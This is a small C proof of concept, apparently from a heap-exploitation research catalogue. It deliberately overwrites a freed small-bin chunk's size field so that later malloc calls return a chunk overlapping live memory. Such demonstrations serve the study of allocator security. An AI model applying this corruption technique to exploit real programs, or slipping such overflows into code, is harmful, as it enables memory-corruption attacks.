#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdio.h>

#include "malloc-lib.h"

int main() {
  int sz = 0x100;
  int sz2 = 0x200;

  // [PRE-CONDITION]
  //    sz : any small bin size
  //    sz2 : any small bin size
  //    assert(sz2 > sz)
  // [BUG]
  // [POST-CONDITION]
  //    two chunks overlap

  void* p1 = malloc(sz);
  void* p2 = malloc(sz);
  void* p3 = malloc(sz);

  // move p2 to the unsorted bin
  free(p2);

  // move p2 to the small bin
  void* p4 = malloc(sz2);

  // [BUG] overflowing p1
  struct malloc_chunk *c2 = raw_to_chunk(p2);
  // growing size into double
  c2->size = 2 * chunk_size(sz) | 1;

  // p5's chunk size = chunk_size(sz) * 2
  void *p5 = malloc(sz);
  // move p5 to the unsorted bin
  free(p5);

  // splitting p5 into half and returning p6
  void* p6 = malloc(sz);
  // returning the remainder
  void* p7 = malloc(sz);

  // p3 and p7 overlap
  assert(p3 == p7);
}
